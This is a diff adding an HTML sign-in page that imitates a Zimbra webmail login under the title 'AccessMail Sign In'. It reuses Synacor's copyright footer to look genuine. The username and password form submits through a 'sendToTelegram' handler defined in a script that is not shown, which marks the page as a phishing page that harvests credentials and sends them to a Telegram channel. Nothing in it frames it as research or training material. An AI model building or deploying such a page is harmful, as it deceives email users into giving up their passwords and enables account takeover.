@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link href='https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css' rel='stylesheet'>
+    <script src="https://kit.fontawesome.com/9192bf1b3f.js" crossorigin="anonymous"></script>
+    <link rel="icon" href="favicon.ico">
+    <link rel="stylesheet" href="style.css">
+    <script src="script.js" defer></script>
+    <title>AccessMail Sign In</title>
+</head>
+<body>
+
+    <div class="container">
+        <div class="image">
+            <img src="upscalemedia-transformed.png" alt="" width="240px" style="cursor:pointer;">
+        </div>
+        <p class="top">Sign In</p>
+        <div id="error"></div>
+        <div class="center">
+            <form id="form" action="" onsubmit="sendToTelegram(event)" class="form">
+                <label for="username">Username</label>
+                <div class="input-box">
+                    <input type="text" name="username" id="username" class="username" autocomplete="off" autocorrect="off" required>
+                </div>
+                <label for="password">Password</label>
+                <div class="input-box">
+                    <input type="password" name="password" id="password" class="password" autocomplete="off" required>
+                    <button id="toggle">Show</button>
+                </div>
+
+                <div class="bottom">
+                    <button type="submit" class="btn">Sign In</button>
+
+                    <div class="check">
+                        <label><input type="checkbox">Stay signed in</label>
+                    </div>
+                </div>
+            </form>
+            <div class="down">    
+            <p>Web App Version</p>
+
+            <div class="select">
+                <select>
+                    <option>Default</option>
+                    <option>Classic</option>
+                    <option>Modern</option>
+                </select> 
+
+                <i class="fa-solid fa-circle-question"></i>
+            </div>           
+        </div>
+        </div>
+
+    </div>
+
+
+
+
+    <footer>
+        <span>Copyright © 2005-2025 Synacor, Inc. All rights reserved. "Zimbra" is a registered trademark of Synacor, Inc.</span>
+    </footer>
+    
+</body>
+</html>
